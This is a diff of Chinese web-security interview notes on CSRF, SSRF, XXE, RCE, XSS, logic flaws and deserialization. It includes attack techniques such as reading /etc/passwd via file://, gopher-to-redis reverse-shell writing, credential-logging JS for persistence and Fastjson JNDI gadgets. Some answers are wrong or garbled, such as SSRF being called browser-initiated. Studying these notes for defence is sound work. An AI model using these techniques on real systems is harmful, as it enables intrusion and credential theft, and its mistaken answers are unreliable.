-危害:
-以受害者名义执行一切不利的事情
-
-修复:
-增加token 验证来源
-
-samesite防御CSRF的原理？
-SameSite属性可用于控制cookie是否以及如何在CSRF中被提交的。通过设置会话cookie的属性，应用程
-序可以防止浏览器的默认行为，即自动将cookie添加到请求中，而不管请求来自何处。
-
-json格式的CSRF如何防御？
-用户操作验证，在提交数据时需要输入验证码
-请求来源验证，验证请求来源的referer
-表单token验证
-
-csrf防御:
-验证来源，增加token，设置会话时间机制，增加验证码等
-
-csrf使用POST请求时，如何攻击？
-将参数放在http的请求body里发送给服务器
-
-xss和csrf的区别
-xss跨站脚本攻击，是盗取cookie，csrf跨站请求伪造，利用cookie
-
-csrf为什么用token可以防御
-token原理-->
-1,用户访问页面时，服务器会在后端生成一个随机的 token，并将 token 返回给前端页面。
-2, 前端页面在生成表单时，将 token 值添加到表单中作为隐藏字段
-3,当用户提交表单时，浏览器会将 token 字段一同发送给服务器。
-4,服务器在接收到表单请求时，会验证请求中的 token 值是否与服务器预期的一致。如果一致，则处理
-请求，否则拒绝请求。
-总结：由于攻击者无法获取到服务器生成的随机 token，也无法在用户提交表单时伪造一个有效的
-token，因此 CSRF token 可以有效地防范 CSRF 攻击。
-
-ssrf和csrf区别
-ssrf跨服务器请求伪造，由浏览器发起
-csrf跨站请求伪造，由客户端发起
-
-csrf利用成功的条件是什么
-用户登录了相关的网站，并且权限相同，用户得访问攻击者构造的恶意地址
-
-网站可能存在CSRF漏洞的位置
-密码修改，信息更改，评论，关注等等
-
-同源策略指的是什么
-协议相同，端口相同，域名相同
-```
-
-
-
-### SSRF
-
-```
-原理:
-服务器请求伪造，通过服务器打内网，控制内网一台服务器攻击其他服务器
-
-危害:
-探测内网存活主机，攻击内网和本地的应用程序，file协议读取文件等
-
-修复:
-白名单过滤，屏蔽返回详细信息，禁止不必要的协议
-
-ssrf利用哪些伪协议
-file:/// 从文件系统中获取文件内容，如，file:///etc/passwd
-dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：
-sftp:// SSH文件传输协议或安全文件传输协议
-ldap:// 轻量级目录访问协议
-tftp:// 简单文件传输协议
-gopher:// 分布式文档传递服务，可使用gopherus生成payload
-
-ssrf如何绕过
-编码绕过 句号绕过 端口绕过 @绕过
-
-SSRF无回显怎么利用
-反向连接
-
-漏洞中绕过IP限制的方法
-更改IP写法 利用302跳转 使用非http协议
-
-ssrf怎么用redis写shell
-一、对内网扫描，获取 banner
-二、攻击运行在内网的应用，主要是使用 GET 参数就可以实现的攻击（比如
-Struts2，sqli 等）
-三、利用协议读取本地文件
-四、云计算环境 AWS Google Cloud 环境可以调用内网操作 ECS 的 API
-
-说一下 weblogic ssrf漏洞
-通过SSRF的gopher协议操作内网的redis 利用 redis 将反弹 shell 写入
-crontab 定时任务，url 编码，将\r 字符串替换成%0d%0a
-
-SSRF禁用127.0.0.1后如何绕过
-进制转换 dns解析 句号和冒号
-
-一般来说 哪里存在ssrf漏洞
-所有调用外部资源的参数都可能存在ssrf漏洞，如分享，转码服务，在线翻译。文章图片收藏功能等。
-```
-
-
-
-### XXE
-
-```
-原理
-原理：
-xml外部实体注入漏洞，没有对xml文件进行过滤，导致加载恶意外部文件和代码
-xml文档包括xml声明，dtd文档定义（元素名称加类型）
-
-危害:
-任意文件读取，命令执行，内网端口扫描，攻击内网，发动ddos等
-
-修复:
-使用开发语言默认提供禁用外部实体方法
-过滤用户提交的xml数据
-
-xxe有哪些引入方式
-本地引入，外部引入，外部参数实体引入，
-
-遇到xxe盲注怎么处理
-dns外带或外部实体注入
-
-xxe如何命令执行
-PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上
-
-xxe会用到哪些函数
-file_get_content()函数把整个文件读入一个字符串中
-LoadXML函数用于加载XML字符串的方法
-simplexml_load_string函数将xml格式字符串转换为对应的SimpleXMLElement
-
-xxe无回显探测
-无回显：建立dtd、xml调用
-
-java导致xxe的常见原因
-java存在非常多解析xml的库，会大量使用到xml，就会出现使用不同的库对xml进行解析
-
-如何找xxe漏洞
-后缀为.ashx,响应体含xml
-```
-
-
-
-### RCE
-
-```
-原理:
-攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。
-
-危害
-执行恶意代码或者命令，写入恶意文件getshell，读取敏感文件等
-
-修复
-验证和过滤用户输入，使用白名单和最小权限原则，
-
-漏洞产生条件
-1. 调用第三方组件存在的代码执行漏洞。
-2. 用户输入的内容作为系统命令的参数拼接到命令中。
-3. 对用户的输入过滤不严格。
-4. 可控变量或漏洞函数。
-
-命令执行和代码执行的区别
-这两者的区别主要在于命令执行是调用操作系统命令进行执行，而代码执行是调用服务器网站的代码进
-行执行
-
-PHP代码执行的危险函数 PHP命令执行函数
-PHP 代码执行的危险函数：call_user_func()、
-call_user_func_array()、create_function()、
-array_map()
-PHP 命令执行函数：system()、shell_exec()、
-passthru()、exec()、popen()、proc_open()、putenv()
-
-命令执行一般出现在哪些地方
-带参数的地方，常见的路由器，防火墙，入侵检测，运维平台等。
-
-sql server命令执行
-xp_cmd
-
-sql server的命令执行 除了xp_cmdshell还有别的方式吗？
-COM M$直接调COM
-CLR 使用16进制代码来创建自定义函数，不需要写文件
-
-代码执行 文件读取 命令执行函数
-1）代码执行：
-eval,preg_replace+/e,assert,call_user_func,call_user_func_array,cre
-ate_function
-2）文件读取：
-file_get_contents(),highlight_file(),fopen(),read
-file(),fread(),fgetss(),
-fgets(),parse_ini_file(),show_source(),file()等
-3)命令执行：
-system(), exec(), shell_exec(), passthru() ,pcntl_exec(),
-popen(),proc_open()
-
-
-如何挖掘命令执行漏洞
-（1）执行系统命令: assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,``(反单引
-号）
-（2）代码执行与加密: eval, assert, call_user_func,base64_decode, gzinflate, gzuncompress,
-gzdecode, str_rot13
-（3）文件包含与生成: require, require_once, include, include_once, file_get_contents,
-file_put_contents, fputs, fwrite
-（4）.htaccess: SetHandler, auto_prepend_file, auto_append_file
-
-struts2命令执行漏洞
-1，URL中存在特定的Struts2命名空间（namespace）和操作名（action）
-2，HTTP请求中包含特定的Struts2参数名称。
-```
-
-
-
-### XSS
-
-```
-原理
-插入恶意脚本，实现对浏览器攻击
-
-危害:
-盗取用户cookie，修改网页内容，向其他用户持续传播恶意脚本。记录键盘等
-
-修复
-对cookie设置httponly，对输入的数据进行html转义，白名单过滤等
-
-xss分类
-存储型，反射型，dom型
-
-存储型xss怎么利用
-涉及到可以留言的地方都可以使用，导致更多用户受害
-
-有shell情况下如何使用xss实现对目标站的长久控制
-后台登录处加一段记录登录账号密码的 js，并且判断是否登录成功，如果登录成功，就把账号密码记 录
-到一个生僻的路径的文件中或者直接发到自己的网站文件中。(此方法适合有价值并且需要深入控 制权限
-的网络)。 在登录后才可以访问的文件中插入XSS脚本
-
-
-xss弹窗函数和常见的xss绕过策略
-alert,confirm,prompt 三种函数
-1、 前端限制绕过
-2、 大小写混合
-3、 拼凑绕过
-4、 编码
-5，<img/src=1>等等
-
-xss常用的js编码
-html 话可以用十进制、十六进制；js 代码可以使用3个八进制、两个十六进制；
-
-cookie已经标记了httponly，我们还能怎么继续利用，使伤害最大化
-可以采用其他的标签img,link,iframe,video,audio进行绕过。
-
-xss平台
-xss在线平台 beef
-
-扫描器是怎么检测XSS漏洞的？
-检测alert confirm prompt无头浏览器上的事件
-测试XSS保护旁路和反射参数的请求/响应
-
-输出到href的XSS如何防御？
-输出出现在a标签的href属性里面,可以使用javascript协议来执行js
-
-如果你Xss打了后台，发现是内网的怎么办
-self xss + csrf +ssrf 到 getshel
-
-xss是如何盗取cookie的
-document cookie
-
-xss为什么无法用同源策略
-相同协议，相同端口，相同host
- 
-同源策略主要是限制了页面最后那个的脚本从另一个源加载资源时的行为，这对于防范恶意页面是一
-种很好的防御机制，如果恶意脚本请求了非同源的一个东西，那么这种行为就很可能因为同源策略的限
-制被浏览器拒绝，从而在某种程度上缓解了攻击。
- 
-对于about:blank和javascript:这种特殊的 URL，他们的源应当是继承自加载他们的页面的源，他们本
-身并没有『源』的概念。
-```
-
-
-
-### 逻辑漏洞
-
-```
-逻辑漏洞的越权都有哪些？
-分为垂直越权和平行越权，垂直越权，a>b权限，用b垂直越权后可以操作a
-平行越权，相等权限，可以操作同权限任何人
-
-常见的逻辑漏洞都有哪些
-登录页面：返回凭证，暴力破解，验证码登录爆破与登录绕过，短信轰炸，seesion覆盖
-注册页面：任意用户注册，短信轰炸，返回凭证，注册覆盖
-密码找回：任意用户密码重置，短信轰炸，找回凭证
-会员系统：水平垂直越权访问，订单越权查看修改，资料查看修改，换绑手机号修改，换绑短信轰炸，
-支付系统：运费修改，商品价格，数量修改，支付金额修改，优惠券金额数量修改，积分修改，收货地
-址越权便利等
-并发数据包：多次请求，一并发送
-未授权访问：通过使用默认凭据、枚举账户、猜测密码、绕过身份验证机制、修改请求等等，来获取敏
-感信息、执行未经授权的操作，
-图形验证码：返回包验证码，爆破绕过等
-
-说几种业务逻辑漏洞以及修复方式
-1，密码找回漏洞中存在：
-密码允许暴力破解。
-存在通用型找回凭证。
-可以跳过验证步骤。
-找回凭证可以拦截数据包获取通过以上方式，再凭借厂商提供的密码找回功能来得到密码。
-2，身份认证漏洞中最常见的是
-会话固定攻击。
-Cookie 仿冒。
-只要得到 Session或Cookie 即可伪造用户身份。
-3，验证码漏洞中存在：
-验证码允许暴力破解。
-验证码可以通过 Javascript 或者改包的方法来进行绕过。
-
-逻辑漏洞如何挖掘
-1、确定业务流程
-2、寻找流程中可以被操控的环节
-3、分析可被操控环节中可能产生的逻辑问题
-4、尝试修改参数触发逻辑问题
-```
-
-
-
-### 序列化和反序列化
-
-```
-原理
-序列化是将对象的状态信息转换为可以存储或传输的形式的过程。序列化后的对象可以通过网络传输，
-或者保存在文件或数据库中。反序列化是将序列化数据恢复为对象的过程，可以在反序列化后访问和操
-作对象。
-
-
-危害
-1. 不受限制的反序列化：如果反序列化操作没有适当的验证和限制，允许任意的序列化数据被反序列
-化，攻击者可以构造恶意的序列化数据来执行恶意代码。
-2. 未经过滤的输入：如果反序列化操作接受未经过滤的输入数据，攻击者可以通过构造特定的恶意数
-据来执行命令或导致不受控制的行为。
-3. 自定义的反序列化逻辑：如果使用自定义的反序列化逻辑而不是使用安全的序列化库或框架，可能
-会导致安全问题。自定义逻辑可能缺乏必要的安全验证和过滤步骤，从而容易受到攻击。
-4. 恶意的序列化数据：如果攻击者能够在反序列化操作中提供恶意构造的序列化数据，可能会导致命
-令执行或其他不受控制的行为。
-
-
-修复
-1、在反序列化过程中对数据进行严格的验证和过滤，确保数据来源可信。
-2、使用安全的序列化库或框架，及时关注并修复已知漏洞。
-3、采用安全编程实践，如最小权限原则、输入验证、输出编码等。
-
-漏洞利用思路
-1、构造恶意的序列化数据。
-2、通过网络传输、文件上传或其他途径将恶意数据送达目标系统。
-3、利用目标系统的反序列化过程中的漏洞，执行恶意代码、窃取敏感信息或造成拒绝服务等攻击。
-
-漏洞产生原因
-1、反序列化过程中没有对数据进行有效的验证和过滤。
-2、序列化库或框架本身存在漏洞。
-3、应用程序处理序列化数据的逻辑设计不当。
-
-说一下shiro反序列化的形成原因、利用链
-AES加密的密钥Key被硬编码在代码里，意味着每个人通过源代码都能拿到AES加密的密钥。因此，攻击
-者构造一个恶意的对象，并且对其序列化，AES加密，base64编码后，作为cookie的rememberMe字段
-发送。Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞
-
-fastjson反序列化
-Fastjson是阿里巴巴开发的一款高性能的Java JSON库。在某些版本的Fastjson中，存在反序列化漏洞。
-攻击者可以通过构造恶意的JSON数据，执行任意代码或获取敏感信息。
-解决方案：
-1，升级到最新版本的Fastjson，以避免已知漏洞的影响。
-2，在反序列化过程中，使用ParserConfig.getGlobalInstance().setAutoTypeSupport(false)禁用
-Fastjson的自动类型推断功能。
-3，对用户输入进行严格的验证和过滤，确保数据来源可信。
-4、采用安全编程实践，如输入验证、输出编码等。
-
-php序列化和反序列化
-serialize() 和 unserialize() 在 PHP内部实现上是没有漏洞的，之所以会产生反序列化漏洞是因为应用程
-序在处理对象、魔术函数以及序列化相关问题的时候导致的。
-当传给 unserialize() 的参数可控时，那么用户就可以注入精心构造的payload。当进行反序列化的时候就
-有可能会触发对象中的一些魔术方法，造成意想不到的危害。
-
-python序列化和反序列化
-Python 的序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输，然后使用的时候再将字
-节流转化回原始的对象的一个过程，Python反序列化后产生的对象会在结束时触发reduce()函数从而触
-发恶意代码。
-防御：
-1、用更高级的接口__getnewargs()、getstate()、setstate()等代替reduce()魔术方法；
-2、进行反序列化操作之前，进行严格的过滤，若采用的是pickle库可采用装饰器实现。
-
-java序列化和反序列化
-Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，
-ObjectOutputStream类的 writeObject() 方法可以实现序列化。反序列化是指把字节序列恢复为 Java 对
-象的过程，ObjectInputStream 类的 readObject() 方法用于反序列化。漏洞成因序列化和反序列化本身
-并不存在问题。但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序
-列化产生非预期的对象。
-
-weblogic反序列化原理
-xml 反序列化漏洞 还有后台文件上传 还有二次 urldecode 权限绕过，t3协议等
-
-jboss反序列化原理
-jboss的反序列化漏洞出现在：
-jboss\server\all\deploy\httphainvoker.sar\invoker.war\WEBINF\classes\org\jboss\invocation\http\
-servlet目录下的ReadOnlyAccessFilter.class文件中的doFilter中。 程序获取http数据保存到了
-httpRequest中，序列化后保存到了ois中，然后没有进行过滤操作，直接 使用了readObject（）进行了
-反序列化操作保存到了mi变量中，这其实就是一个典型的java反序列化漏洞
-
-java rmi反序列化漏洞
-Java RMI 是一个允许Java对象在不同的Java虚拟机之间进行方法调用的技术。Java RMI 在内部使用序列
-化和反序列化进行对象传输。但是，RMI 服务可能存在安全漏洞，攻击者可以通过构造恶意的序列化对
-象，对远程服务器执行任意代码。
-解决方案：
-1，在服务器端对反序列化数据进行合法性验证，确保数据来源可信。
-2、使用最新版本的Java，以避免已知漏洞的影响。
-3、限制网络访问权限，只允许受信任的IP地址访问RMI服务。
-
-
-shiro550和721区别
-流量特征：remberme=delectme
-区别：550不需要remembercookie，721需要
-
-log4j
-log4j 2中JNDI解析未作限制，可以直接访问到远程对象，构造恶意JNDI表达式即可达到远程命令执行
-
-PHP反序列化魔法函数
-PHP反序列化的时候，基本都是围绕着serialize()，unserialize()这两个函数。
-serialize() 函数序列化对象后，可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。
-unserialize() 函数用于将通过 serialize() 函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。
-```
-
+#### 典型案例
+- **Shiro反序列化**：AES密钥硬编码，攻击者构造恶意序列化数据，通过`rememberMe`Cookie触发反序列化执行命令；  
+- **Fastjson反序列化**：通过`@type`指定恶意类（如`com.sun.rowset.JdbcRowSetImpl`），触发JNDI注入执行代码；  
+- **PHP反序列化**：利用魔术方法（如`__wakeup()` `__destruct()`），在反序列化时执行恶意代码。
